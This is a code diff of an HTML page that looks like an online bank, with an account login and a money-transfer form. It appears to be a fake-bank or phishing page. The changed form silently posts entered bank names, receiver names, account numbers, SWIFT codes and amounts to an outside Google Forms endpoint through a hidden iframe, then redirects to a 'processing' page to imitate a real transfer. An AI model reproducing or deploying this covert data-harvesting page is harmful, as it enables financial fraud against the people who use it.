@@ -7,6 +7,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <link rel="stylesheet" href="css/default.css">
+    <link rel="stylesheet" href="css/new-form.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <link rel="icon" href="img/kolos.png">
   </head>
@@ -23,7 +24,7 @@
           <span id="accNum-txt">Account number</span>
           <input id="account-number-input" type="number" autofocus>
           <span id="error-txt"></span>
-          <input id="account-number-btn" type="submit" value="Next">
+          <input id="account-number-btn" type="button" value="Next">
           <div class="load-box hide">
             <i class="fa fa-spinner fa-spin"></i>
           </div>
@@ -33,7 +34,7 @@
           <span id="accNum-txt">Account password</span>
           <input class="account-input-fields" id="account-password-input" type="password" autofocus>
           <span id="error-txt"></span>
-          <input class="account-checks-btn" id="account-password-btn" type="submit" value="Login">
+          <input class="account-checks-btn" id="account-password-btn" type="button" value="Login">
 
         </div>
 
@@ -76,24 +77,24 @@
         </div>
 
       </div>
-      <script type="text/javascript">var submitted=false;</script>
-      <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {window.location='default.html';}"></iframe>
-      <form action="https://docs.google.com/forms/u/3/d/e/1FAIpQLScUDwULeSsvoqaHhSGRC90HTvpctPVKbdVYGQZzl_VHHxWgBw/formResponse" method="post" onkeydown="return event.key != 'Enter';" target="hidden_iframe" onsubmit="submitted=true;">
-        <div class="receiver-info">
+      <div class="n-form-container n-form">
+        <script type="text/javascript">var submitted=false;</script>
+        <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;" onload="if(submitted) {window.location='processing';}"></iframe>
+       <form class="" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScDSINyG9euoTj6BtKtiwK2mrEe84D9MPW4vojVql2kGVXWXw/formResponse" method="post" target="hidden_iframe" onsubmit="submitted=true;">
           <div class="form-group">
             <label>Bank name</label>
-            <input class="bank-name-input all-inputs" type="text" name="entry.2005620554">
+            <input class="n-name-input" type="text" name="entry.2005620554" value="" required>
           </div>
           <div class="form-group">
-            <label>Account number</label>
-            <input class="account-number-input all-inputs" type="number" name="entry.1045781291">
+            <label for="n-bankname">Receiver name</label>
+            <input class="n-accountname-input" type="text" name="entry.1024596794" value="" required>
           </div>
           <div class="form-group">
-            <label>Receiver name</label>
-            <input class="receiver-name-input all-inputs" type="text" name="entry.1065046570">
+            <label for="n-bankname">Receiver account number</label>
+            <input class="n-accountnumber-input" type="number" name="entry.540922683" value="" required>
           </div>
           <div class="form-group">
-            <label>Country</label>
+            <label for="n-bankname">Select Country</label>
             <select>
               <option>Destination country</option>
               <option>Algeria</option>
@@ -197,42 +198,20 @@
             </select>
           </div>
           <div class="form-group">
-            <label>SWIFT code</label>
-            <input class="swift-code-input all-inputs" type="text">
+            <label for="n-bankname">Swift Code</label>
+            <input class="n-swiftcode-input" type="text" name="entry.824905481" required>
           </div>
-
           <div class="form-group">
-            <label>Amount</label>
-            <input class="amount-input all-inputs" type="number" name="entry.1166974658">
+            <label for="n-bankname">Amount</label>
+            <input class="n-accountnumber-input" type="number" name="entry.1166974658" required>
           </div>
-          <p id="error-txt"></p>
-          <button class="transfer-nxt-btn" type="button">Next</button>
-        </div>
-        <div class="summary-section transfer-inner-sections">
-          <span>You are about to send £</span> <span class="amount-txt">200</span>
-          <br><br>
-          <span>Receiver name: </span> <span class="receiverName-txt summary-txts"></span><br><br>
-          <span>Bank name: </span> <span class="bankName-txt summary-txts"></span><br><br>
-          <span>Account number: </span> <span class="accNumber-txt summary-txts"></span><br><br>
-
-          <div class="secret-code">
-            <p>Enter your secret code to confirm this transfer</p>
-            <input class="secret-code-input" type="number">
-            <input class="transfer-btn" type="button" value="Transfer" onclick="confirmSecretCode()">
-            <input class="transfer-btn transfer-btn-send" id="submit" type="submit" value="Confirm Transfer" onclick="moveToLoaderPage()" style="display:none;">
-            <p class="error-txt" id="error-txt"></p>
+          <div class="form-group form-btn-holder">
+            <input class="send-form-btn" type="submit" name="n-submit-form" value="Transfer">
           </div>
-        </div>
-        <div class="confirmed-section hide transfer-inner-sections">
 
-          <div class="secret-code transfer-approved">
-            <br><br><br>
-            <p>You transfer has been approved</p>
-            <a href="default.html"><input type="button"  value="Confirm Transfer" style="background: transparent; border: none;"> <i class="fa fa-check"></i></a>
-
-          </div>
-        </div>
-      </form>
+          <br><br><br><br>
+        </form>
+      </div>
     </div>
 
     <div class="default-section" style="background: url(img/obank.png)">
